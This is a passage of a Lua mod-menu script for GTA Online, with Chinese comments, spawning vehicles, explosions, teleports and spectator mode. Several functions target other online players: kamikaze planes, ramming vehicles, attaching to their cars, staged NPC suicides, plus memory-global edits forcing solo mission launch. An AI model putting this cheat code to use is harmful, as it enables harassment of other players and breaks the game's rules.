                    request_model(model)
                    local vehicle = entities.create_vehicle(model, fireworkPos, 0)
                    ENTITY.SET_ENTITY_COLLISION(vehicle, false, true)
                    ENTITY.SET_ENTITY_ROTATION(vehicle, math.random(-180.0, 180.0), math.random(-180.0, 180.0), math.random(-180.0, 180.0), 0, true)
                    VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, 25)
                    util.yield(250)
                    ENTITY.SET_ENTITY_COLLISION(vehicle, true, true)
                end
            end
        end
    end
end

----端粒枪
function Telomere_gun()
    draw_string("~b~已准备就绪", 0.02, 0.05, 0.4, 1)
    if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        local hash = util.joaat("w_lr_firework_rocket")
        local player_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0.0, 0.5, 0.5)
        local dir = {}
        local c2 = get_offset_from_camera(15)
        dir.x = (c2.x - player_pos.x) * 15
        dir.y = (c2.y - player_pos.y) * 15
        dir.z = (c2.z - player_pos.z) * 15

        if ENTITY.DOES_ENTITY_EXIST(particle_gun_bullet) then
            delete_entity(particle_gun_bullet)
        end
        particle_gun_bullet = create_object(hash, player_pos.x, player_pos.y, player_pos.z)
        set_entity_full_visible(particle_gun_bullet,false)
        ENTITY.SET_ENTITY_INVINCIBLE(particle_gun_bullet,true)
        ENTITY.SET_ENTITY_COLLISION(particle_gun_bullet, false, true)
        ENTITY.SET_ENTITY_HAS_GRAVITY(particle_gun_bullet, false)

        local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(particle_gun_bullet, 1, dir.x, dir.y, dir.z, false, false, false, false)
        ENTITY.SET_ENTITY_ROTATION(particle_gun_bullet, cam_rot.x, cam_rot.y, cam_rot.z, 0, true)

        util.yield(200)
        local end_time = os.time() + 4
        while end_time >= os.time() do
            draw_string("~r~充能中...", 0.02, 0.05, 0.4, 1)
            PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_ID(), true)
            local pos = ENTITY.GET_ENTITY_COORDS(particle_gun_bullet, false)
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 5, 1, true, false, 0, false)
            util.yield()
        end
    end
end

----抓钩枪
function grappling_gun()
    if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) and PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false) then
        local raycast_coord = raycast_gameplay_cam(-1, 10000.0)
        if raycast_coord[1] == 1 then
            local lastdist = nil
            TASK.TASK_SKY_DIVE(PLAYER.PLAYER_PED_ID())
            while true do
                if PAD.IS_CONTROL_JUST_PRESSED(45, 45) then 
                    break
                end
                if raycast_coord[4] ~= 0 and ENTITY.GET_ENTITY_TYPE(raycast_coord[4]) >= 1 and ENTITY.GET_ENTITY_TYPE(raycast_coord[4]) < 3 then
                    ggc1 = ENTITY.GET_ENTITY_COORDS(raycast_coord[4], true)
                else
                    ggc1 = raycast_coord[2]
                end
                local c2 = players.get_position(PLAYER.PLAYER_ID())
                local dist = Get_distance(ggc1, c2, true)
                -- safety
                if not lastdist or dist < lastdist then 
                    lastdist = dist
                else
                    break
                end
                if ENTITY.IS_ENTITY_DEAD(PLAYER.PLAYER_PED_ID()) then
                    break
                end
                if dist >= 10 then
                    local dir = {}
                    dir['x'] = (ggc1['x'] - c2['x']) * dist
                    dir['y'] = (ggc1['y'] - c2['y']) * dist
                    dir['z'] = (ggc1['z'] - c2['z']) * dist
                    ENTITY.SET_ENTITY_VELOCITY(PLAYER.PLAYER_PED_ID(), dir['x'], dir['y'], dir['z'])
                end
                util.yield()
            end
        end
    end
end

----单人强制启动
function allow_play_alone()
    if IS_SCRIPT_RUNNING("fmmc_launcher") then
        if GET_INT_LOCAL("fmmc_launcher", 19709 + 34) ~= 0 then
            if GET_INT_LOCAL("fmmc_launcher", 19709 + 15) > 1 then
                SET_INT_LOCAL("fmmc_launcher", 19709 + 15, 1)
                SET_INT_GLOBAL(794744 + 4 + 1 + (GET_INT_LOCAL("fmmc_launcher", 19709 + 34) * 89) + 69, 1)
            end
            
            SET_INT_GLOBAL(4718592 + 3526, 1)
            SET_INT_GLOBAL(4718592 + 3527, 1)
            SET_INT_GLOBAL(4718592 + 3529 + 1, 1)
            SET_INT_GLOBAL(4718592 + 178821 + 1, 0)
        end
    end
end

----绘制连线
function draw_line_entity_to_entity(ent1, ent2, color)
    color = color or {r = 0, g = 0 , b = 255, a = 255}
    local pos1 = ENTITY.GET_ENTITY_COORDS(ent1, true)
    local pos2 = ENTITY.GET_ENTITY_COORDS(ent2, true)
    GRAPHICS.DRAW_LINE(pos1.x, pos1.y, pos1.z, pos2.x, pos2.y, pos2.z, color.r, color.g, color.b, color.a)
end

----货运直升机
function spawn_cargobob_with_magnet()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
    local heading = ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID())
    local cargobob = create_vehicle(util.joaat("cargobob"), pos.x, pos.y, pos.z + 5, heading)
    VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(cargobob, 1.0)
    VEHICLE.SET_HELI_BLADES_FULL_SPEED(cargobob)
    VEHICLE.CREATE_PICK_UP_ROPE_FOR_CARGOBOB(cargobob, 1)
    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), cargobob, -1)
end
----运兵直升机
function spawn_cargobob()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
    local heading = ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID())
    local cargobob = create_vehicle(util.joaat("cargobob"), pos.x, pos.y, pos.z + 5, heading)
    VEHICLE.SET_HELI_BLADES_FULL_SPEED(cargobob)
    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), cargobob, -1)
    if not VEHICLE.DOES_CARGOBOB_HAVE_PICK_UP_ROPE(cargobob) then
        VEHICLE.CREATE_PICK_UP_ROPE_FOR_CARGOBOB(cargobob, 0) --创建拾取绳
    end

    local radius = 15.0
    while ENTITY.DOES_ENTITY_EXIST(cargobob) do
        local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
        local vehicle = VEHICLE.GET_CLOSEST_VEHICLE(cargobobPos.x, cargobobPos.y, cargobobPos.z, radius, 0, 70) --只获取陆地载具
        if ENTITY.DOES_ENTITY_EXIST(vehicle) then
            --绘制连线
            draw_line_entity_to_entity(cargobob, VEHICLE.GET_CLOSEST_VEHICLE(cargobobPos.x, cargobobPos.y, cargobobPos.z, radius, 0, 70))
            --分离附加
            if PAD.IS_CONTROL_JUST_RELEASED(0, 104) then --H
                request_control(vehicle)
                if not VEHICLE.IS_VEHICLE_ATTACHED_TO_CARGOBOB(cargobob, vehicle) then
                    VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(vehicle, 5.0) --平放载具
                    ENTITY.SET_PICK_UP_BY_CARGOBOB_DISABLED(vehicle, false)  --禁用载具被钩
                    VEHICLE.ATTACH_VEHICLE_TO_CARGOBOB(cargobob, vehicle, -1 , 0.0, 0.0, -1.0)
                end
            end
        end
        util.yield()
    end
end
----吊挂直升机
function spawn_skylift()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
    local heading = ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID())
    local skylift = create_vehicle(util.joaat("skylift"), pos.x, pos.y, pos.z + 5, heading)
    VEHICLE.SET_HELI_BLADES_FULL_SPEED(skylift)
    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), skylift, -1)
    local radius = 15.0
    while ENTITY.DOES_ENTITY_EXIST(skylift) do
        local skyliftPos = ENTITY.GET_ENTITY_COORDS(skylift, true)
        local vehicle = VEHICLE.GET_CLOSEST_VEHICLE(skyliftPos.x, skyliftPos.y, skyliftPos.z, radius, 0, 70) --只获取陆地载具
        if ENTITY.DOES_ENTITY_EXIST(vehicle) then
            --绘制连线
            draw_line_entity_to_entity(skylift, vehicle, {r = 0, g = 0 , b = 255, a = 255})
            --分离附加
            if PAD.IS_DISABLED_CONTROL_JUST_PRESSED(0, 46) then
                request_control(vehicle)
                if ENTITY.IS_ENTITY_ATTACHED_TO_ENTITY(vehicle, skylift) then
                    ENTITY.DETACH_ENTITY(vehicle, true, true)
                else
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle, skylift, 0, 0.0, -3.5, -2.0, 0.0, 0.0, 0.0, true, true, true, false, 0, true, 0) 
                end
            end
        end
        util.yield()
    end
end

----神风敢死队
function kamikaze_dare(index, pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local vehicles = {"Lazer", "Mammatus",  "Cuban800"}
    local plane = vehicles[index]
    local hash  = util.joaat(plane)
    request_model(hash)
    local targetPed = PLAYER.GET_PLAYER_PED(pid)
    local pos = get_random_offset_from_entity(targetPed, 20.0, 20.0)
    pos.z = pos.z + 30.0
    local planed = entities.create_vehicle(hash, pos, 0.0)
    set_entity_face_entity(planed, targetPed, true)
    VEHICLE.SET_VEHICLE_FORWARD_SPEED(planed, 150.0)
    VEHICLE.CONTROL_LANDING_GEAR(planed, 3)
    util.yield(1000)
    delete_entity(planed)
end
----撞击玩家
function Impact_player(index, pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local vehicles = {"insurgent2", "phantom2", "adder"}
    local vehicleName = vehicles[index]
    local vehicleHash = util.joaat(vehicleName)
    request_model(vehicleHash)
    local targetPed = PLAYER.GET_PLAYER_PED(pid)
    local coord = get_random_offset_from_entity(targetPed, 12.0, 12.0)
    local vehicle = entities.create_vehicle(vehicleHash, coord, 0.0)
    set_entity_face_entity(vehicle, targetPed, false)
    VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 2)
    VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, 100.0)
    util.yield(1000)
    delete_entity(vehicle)
end

----黑洞
local blackHoleType = 1
local blackHolePos = {x = 0, y = 0, z = 0}
local pushStrength = 1
local pushToX = 1
local pushToY = 1
local pushToZ = 1
function black_hole_type(a)
    blackHoleType = a
end
function black_hole_Sth(a)
    pushStrength = a
end
function black_hole_posuser()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()))
    menu.set_value(blackHolePosX, math.floor(pos.x))--向下取整
    menu.set_value(blackHolePosY, math.floor(pos.y))
    menu.set_value(blackHolePosZ, math.floor(pos.z))
    blackHolePos.x = pos.x
    blackHolePos.y = pos.y
    blackHolePos.z = pos.z
end
function black_hole_posx(a)
    blackHolePos.x = a
end
function black_hole_posy(a)
    blackHolePos.y = a
end
function black_hole_posz(a)
    blackHolePos.z = a
end
function show_balckhole()
    GRAPHICS.DRAW_MARKER_SPHERE(blackHolePos.x, blackHolePos.y, blackHolePos.z, 1, 0, 0, 0, 0.8)
end
function black_hole()
    local blackHolepeds = entities.get_all_peds_as_handles()
    local blackHoleVehicle = entities.get_all_vehicles_as_handles()

    for i, ped in ipairs(blackHolepeds) do
        if ped ~= PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()) then
            blackHoleVehicle[#blackHoleVehicle+1] = ped
        end
    end

    for index, value in ipairs(blackHoleVehicle) do
        vehiclePos = ENTITY.GET_ENTITY_COORDS(value)
        if ENTITY.DOES_ENTITY_EXIST(value) == true then
            if NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(value) == false then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(value)
            end
            if blackHoleType == 1 then
                if blackHolePos.x > vehiclePos.x then
                    pushToX = pushStrength
                elseif blackHolePos.x < vehiclePos.x then
                    pushToX = -pushStrength
                end
                if blackHolePos.y > vehiclePos.y then
                    pushToY = pushStrength
                elseif blackHolePos.y < vehiclePos.y then
                    pushToY = -pushStrength
                end
                if blackHolePos.z > vehiclePos.z then
                    pushToZ = pushStrength
                elseif blackHolePos.z < vehiclePos.z then
                    pushToZ = -pushStrength
                end
                ENTITY.APPLY_FORCE_TO_ENTITY(value, 1, pushToX, pushToY, pushToZ, 0, 0, 0, 0, false, true, true, false)
            elseif blackHoleType == 2 then
                if blackHolePos.x > vehiclePos.x then
                    pushToX = -pushStrength
                elseif blackHolePos.x < vehiclePos.x then
                    pushToX = pushStrength
                end
                if blackHolePos.y > vehiclePos.y then
                    pushToY = -pushStrength
                elseif blackHolePos.y < vehiclePos.y then
                    pushToY = pushStrength
                end
                if blackHolePos.z > vehiclePos.z then
                    pushToZ = -pushStrength
                elseif blackHolePos.z < vehiclePos.z then
                    pushToZ = pushStrength
                end
                ENTITY.APPLY_FORCE_TO_ENTITY(value, 1, pushToX, pushToY, pushToZ, 0, 0, 0, 0, false, true, true, false)
            end
        end
    end
end

----超能者
--闪电侠
function flash_man()
    ENTITY.SET_ENTITY_MAX_SPEED(PLAYER.PLAYER_PED_ID(), 100)
    local dir = ENTITY.GET_ENTITY_FORWARD_VECTOR(PLAYER.PLAYER_PED_ID())
    dir = v3(dir.x * 100, dir.y * 100, dir.z * 100)
    if PAD.IS_CONTROL_PRESSED(0, 21) and PAD.IS_CONTROL_PRESSED(0, 32) then
        if not ENTITY.IS_ENTITY_IN_AIR(PLAYER.PLAYER_PED_ID()) then
            request_ptfx_asset("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY('ent_dst_elec_fire_sp', PLAYER.PLAYER_PED_ID(), 0, 0, 0, 0, 0, 0, 1)
            ENTITY.SET_ENTITY_VELOCITY(PLAYER.PLAYER_PED_ID(), dir.x * 80 , dir.y * 80 , dir.z * 80 )
        end
    end
end
--外星人
function alien_man()
    ENTITY.SET_ENTITY_MAX_SPEED(PLAYER.PLAYER_PED_ID(), 100)
    local dir = ENTITY.GET_ENTITY_FORWARD_VECTOR(PLAYER.PLAYER_PED_ID())
    dir = v3(dir.x * 100, dir.y * 100, dir.z * 100)
    if PAD.IS_CONTROL_PRESSED(0, 21) and PAD.IS_CONTROL_PRESSED(0, 32) then
        if not ENTITY.IS_ENTITY_IN_AIR(PLAYER.PLAYER_PED_ID()) then
            request_ptfx_asset("scr_rcbarry1")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY('scr_alien_teleport', PLAYER.PLAYER_PED_ID(), 0, 0, 0, 0, 0, 0, 1)
            ENTITY.SET_ENTITY_VELOCITY(PLAYER.PLAYER_PED_ID(), dir.x * 80 , dir.y * 80 , dir.z * 80 )
        end
    end
end
--白月光
function moonlight_man()
    ENTITY.SET_ENTITY_MAX_SPEED(PLAYER.PLAYER_PED_ID(), 100)
    local dir = ENTITY.GET_ENTITY_FORWARD_VECTOR(PLAYER.PLAYER_PED_ID())
    dir = v3(dir.x * 100, dir.y * 100, dir.z * 100)
    if PAD.IS_CONTROL_PRESSED(0, 21) and PAD.IS_CONTROL_PRESSED(0, 32) then
        if not ENTITY.IS_ENTITY_IN_AIR(PLAYER.PLAYER_PED_ID()) then
            request_ptfx_asset("scr_rcbarry2")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY('scr_clown_death', PLAYER.PLAYER_PED_ID(), 0, 0, 0, 0, 0, 0, 1)
            ENTITY.SET_ENTITY_VELOCITY(PLAYER.PLAYER_PED_ID(), dir.x * 80 , dir.y * 80 , dir.z * 80 )
        end
    end
end
--太阳花
function sunflower_man()
    ENTITY.SET_ENTITY_MAX_SPEED(PLAYER.PLAYER_PED_ID(), 100)
    local dir = ENTITY.GET_ENTITY_FORWARD_VECTOR(PLAYER.PLAYER_PED_ID())
    dir = v3(dir.x * 100, dir.y * 100, dir.z * 100)
    if PAD.IS_CONTROL_PRESSED(0, 21) and PAD.IS_CONTROL_PRESSED(0, 32) then
        if not ENTITY.IS_ENTITY_IN_AIR(PLAYER.PLAYER_PED_ID()) then
            request_ptfx_asset("scr_rcbarry2")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY('scr_clown_bul', PLAYER.PLAYER_PED_ID(), 0, 0, 0, 0, 0, 0, 1)
            ENTITY.SET_ENTITY_VELOCITY(PLAYER.PLAYER_PED_ID(), dir.x * 80 , dir.y * 80 , dir.z * 80 )
        end
    end
end




----洛奇斯怪兽mk2
function lochness_mk2()
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local monster = MISC.GET_HASH_KEY("h4_prop_h4_loch_monster")--怪兽
    local oppressor = MISC.GET_HASH_KEY("oppressor2")--mk2
    local obj = create_object(monster, pos.x, pos.y, pos.z)
    local veh = create_vehicle(oppressor, pos.x, pos.y, pos.z, 0)
    ENTITY.SET_ENTITY_HEADING(veh, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), veh, -1)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, veh, 0, -0.25, -1.0, 1.0, 0.0, 0.0, -90.0, true, false, false, false, 0, true, 0)
end

----地雷
function spawn_mine()
    local hash = 1246158990
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(PLAYER.PLAYER_ID()), 0, 4, 0)--偏移量坐标,前后,左右,上下
    local landmines = create_object(hash, pos.x, pos.y, pos.z-1)
    ENTITY.SET_ENTITY_HEADING(landmines, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID())-90)
end

----NPC在玩家面前自杀
function do_ped_suicide(ped)
    request_control(ped)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
    WEAPON.GIVE_WEAPON_TO_PED(ped, util.joaat("weapon_pistol"), 1, false, true)
    WEAPON.SET_CURRENT_PED_WEAPON(ped, util.joaat("weapon_pistol"), true)
    request_anim_dict("mp_suicide")
    util.yield(1000)
    local start_time = os.time()
    -- either wait till the ped is standing still, or 3 seconds, whichever is first
    while ENTITY.GET_ENTITY_SPEED(ped) > 1 and os.time() - start_time < 3 do 
        util.yield()
    end
    TASK.TASK_PLAY_ANIM(ped, "mp_suicide", "pistol", 8.0, 8.0, -1, 2, 0.0, false, false, false)
    util.yield(800)
    ENTITY.SET_ENTITY_HEALTH(ped, 0.0, 0)
    util.yield(10000)
    delete_entity(ped)
end
function npc_suicide(index,pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local plyr = PLAYER.GET_PLAYER_PED(pid)
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 1.0, 0.0)
    local ped = 0
    if index == 1 then
        ped = PED.CLONE_PED(plyr, true, false, true)
        ENTITY.SET_ENTITY_COORDS(ped, c.x, c.y, c.z)
        ENTITY.SET_ENTITY_HEADING(ped, ENTITY.GET_ENTITY_HEADING(plyr) + 180)
    else
        local hash = traumatize.value[index]
        request_model(hash)
        ped = entities.create_ped(3, hash, c, ENTITY.GET_ENTITY_HEADING(plyr) + 180)
    end
    do_ped_suicide(ped)
end


----附加实体枪
local seleted_attach_ent = 'vigilante'
function create_attach_ent(hash, x, y, z, target_ent)
    if STREAMING.IS_MODEL_A_PED(hash) then
        local ent = create_ped(1, hash, x, y, z+20, ENTITY.GET_ENTITY_HEADING(target_ent))
        calm_ped(ent, true)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, target_ent--[[ 主实体 ]], 0--[[ boneindex ]], 0, 0, 0, 0, 0, 0, true, false, false, true, 0, true, 0)
    elseif STREAMING.IS_MODEL_A_VEHICLE(hash) then
        local ent = create_vehicle(hash, x, y, z+20, ENTITY.GET_ENTITY_HEADING(target_ent))
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, target_ent--[[ 主实体 ]], 0--[[ boneindex ]], 0, 0, 0, 0, 0, 0, true, false, false, true, 0, true, 0)
    elseif STREAMING.IS_MODEL_VALID(hash) then
        local ent = create_object(hash, x, y, z+20)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(ent, target_ent--[[ 主实体 ]], 0--[[ boneindex ]], 0, 0, 0, 0, 0, 0, true, false, false, true, 0, true, 0)
    end
end
function selete_attach_entity_gun(value)
    seleted_attach_ent = Objn.value[value]
end
function attach_entity_gun()
    local pos = v3.new()
    local target = memory.alloc(8)
    if WEAPON.GET_PED_LAST_WEAPON_IMPACT_COORD(PLAYER.PLAYER_PED_ID(), pos) then
        if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(PLAYER.PLAYER_ID(), target) then
            local target_ent = memory.read_int(target)
            if STREAMING.IS_MODEL_A_PED(ENTITY.GET_ENTITY_MODEL(target_ent)) and PED.IS_PED_IN_ANY_VEHICLE(target_ent) then
                target_ent = PED.GET_VEHICLE_PED_IS_IN(target_ent, false)
            end
            local hash = MISC.GET_HASH_KEY(seleted_attach_ent)
            create_attach_ent(hash, pos.x, pos.y, pos.z, target_ent)
        end
    end
end

----定点打击
function targeted_strike()
    if HUD.IS_WAYPOINT_ACTIVE() then
        local wpos = HUD.GET_BLIP_INFO_ID_COORD(HUD.GET_FIRST_BLIP_INFO_ID(HUD.GET_WAYPOINT_BLIP_ENUM_ID()))
        for i = 1, 30 do
            SE_add_owned_explosion(PLAYER.PLAYER_PED_ID(), wpos.x, wpos.y, wpos.z + 30 - i, 29, 10, true, false, 1)
            FIRE.ADD_EXPLOSION(wpos.x, wpos.y, wpos.z + 30 - i, 29, 10, true, false, 0, false)
            FIRE.ADD_EXPLOSION(wpos.x, wpos.y, wpos.z + 30 - i, 59, 10, true, false, 0, false)
           util.yield(30)
        end
    end
end
----定点循环轰炸
function executeNuke(pos)
    for a = 0, 100, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10.0, true, false, 1.0, false)
        util.yield(50)
    end
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z , 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
    FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 82, 10.0, true, false, 1.0, false)
end
function targeted_loop_strike()
    local waypointPos = HUD.GET_BLIP_INFO_ID_COORD(HUD.GET_FIRST_BLIP_INFO_ID(HUD.GET_WAYPOINT_BLIP_ENUM_ID()))
    if waypointPos then
        local hash = util.joaat('w_arena_airmissile_01a')
        request_model(hash)
        waypointPos.z = waypointPos.z + 30
        local bomb = entities.create_object(hash, waypointPos)
        waypointPos.z = waypointPos.z - 30
        ENTITY.SET_ENTITY_ROTATION(bomb, -90, 0, 0,  2, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, 0, 0, 0, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do
            util.yield_once()
        end
        delete_entity(bomb)
        executeNuke(waypointPos)
    end
end

----指示灯
function pilot_lamp()
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), false) then
        display_buttons({{0, 35, '右转灯'},{1, 130, '双闪灯'},{2, 34, '左转灯'}})
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
        local left = PAD.IS_CONTROL_PRESSED(0, 34)--174[A]
        local right = PAD.IS_CONTROL_PRESSED(0, 35)--175[D]
        local rear = PAD.IS_CONTROL_PRESSED(0, 130)--173[S]
        if left and not right and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
        elseif right and not left and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        elseif rear and not left and not right then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        else
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, false)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, false)
        end
    end
end


----载具附加
function vehicle_attach(index,pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED(pid), true)
    local player_cur_car = entities.get_user_vehicle_as_handle()
    if car ~= 0 then
        request_control(car, 3)
        if index == 1 then
            ENTITY.ATTACH_ENTITY_TO_ENTITY(PLAYER.PLAYER_PED_ID(), car, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true, 0)
        elseif index == 2 then
            if player_cur_car ~= 0 and car ~= player_cur_car then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(car, player_cur_car, 0, 0.0, -5.00, 0.00, 1.0, 1.0, 1, true, true, true, false, 0, true, 0)
            end
        elseif index == 3 then
            if player_cur_car ~= 0 and car ~= player_cur_car then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(player_cur_car, car, 0, 0.0, -5.00, 0.00, 1.0, 1.0, 1, true, true, true, false, 0, true, 0)
            end
        elseif index == 4 then
            ENTITY.DETACH_ENTITY(car, false, false)
            if player_cur_car ~= 0 then
                ENTITY.DETACH_ENTITY(player_cur_car, false, false)
            end
            ENTITY.DETACH_ENTITY(PLAYER.PLAYER_PED_ID(), false, false)
        end
    end
end

----获取标记点坐标
function get_waypoint_coords()
    local coords = HUD.GET_BLIP_INFO_ID_COORD(HUD.GET_FIRST_BLIP_INFO_ID(HUD.GET_WAYPOINT_BLIP_ENUM_ID()))
    coords = waypoint_coord(coords.x,coords.y,coords.z)
    return coords
end
----传送到标记点
function tp_waypoint()
    if HUD.IS_WAYPOINT_ACTIVE() then
        local pos = get_waypoint_coords()
        teleport(pos.x, pos.y, pos.z, true)
    end
end

--自动传送到任务点
function auto_tp_task_points()
    if HUD.DOES_BLIP_EXIST(HUD.GET_FIRST_BLIP_INFO_ID(1)) then
        local mypos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
        local waypoint = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(1))
        local distance = math.ceil(Get_distance(waypoint, mypos, true))
        if distance > 3 then
            teleport(waypoint.x,waypoint.y,waypoint.z, true)
        end
    end
end

----骑乘动物
function riding_animals(index)
    local ranimals = {
        [1] = {hash = util.joaat("a_c_deer"), off = {-0.3, 0.0, 0.25, 0.0, 0.0, 90.0}}, 
        [2] = {hash = util.joaat("a_c_boar"), off = {-0.3, 0.0, 0.35, 0.0, 0.0, 90.0}}, 
        [3] = {hash = util.joaat("a_c_cow"), off = {-0.3, 0.0, 0.15, 0.0, 0.0, 90.0}},
        [4] = {hash = util.joaat("a_c_rabbit_02"), off = {0.1, -0.3, 0.0, 0, 270, 90.0}}
    }
    local hash = ranimals[index].hash
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    local animal = create_ped(8, hash, pos.x, pos.y, pos.z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
    ENTITY.SET_ENTITY_INVINCIBLE(animal, true)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())

    local off = ranimals[index].off
    ENTITY.ATTACH_ENTITY_TO_ENTITY(PLAYER.PLAYER_PED_ID(), animal, PED.GET_PED_BONE_INDEX(animal, 24816), off[1], off[2], off[3], off[4], off[5], off[6], false, false, false, true, 2, true)
    play_animation(PLAYER.PLAYER_PED_ID(), "rcmjosh2", "josh_sitting_loop", 8.0, 1, -1, 2, 1.0)

    while ENTITY.DOES_ENTITY_EXIST(animal) do
        -- 离开
        if PAD.IS_CONTROL_JUST_PRESSED(23, 23) then --F
            ENTITY.DETACH_ENTITY(PLAYER.PLAYER_PED_ID())
            delete_entity(animal)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
        end
        -- 移动
        if PAD.IS_CONTROL_PRESSED(0, 32) then 
            local side_move = PAD.GET_CONTROL_NORMAL(146, 146)
            local fwd = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(animal, side_move*10.0, 8.0, 0.0)
            TASK.TASK_LOOK_AT_COORD(animal, fwd.x, fwd.y, fwd.z, 0, 0, 2)
            TASK.TASK_GO_STRAIGHT_TO_COORD(animal, fwd.x, fwd.y, fwd.z, 20.0, -1, ENTITY.GET_ENTITY_HEADING(animal), 0.5)
        end
        util.yield()
    end
end

----观看玩家
function spectator_mode(pid, toggled)
    spectator_player = toggled
    while spectator_player and PLAYER.GET_PLAYER_PED(pid) ~= 0 do
        NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(true, PLAYER.GET_PLAYER_PED(pid))
        HUD.SET_MINIMAP_IN_SPECTATOR_MODE(true, PLAYER.GET_PLAYER_PED(pid))
        util.yield()
    end
    NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(true, PLAYER.PLAYER_PED_ID())
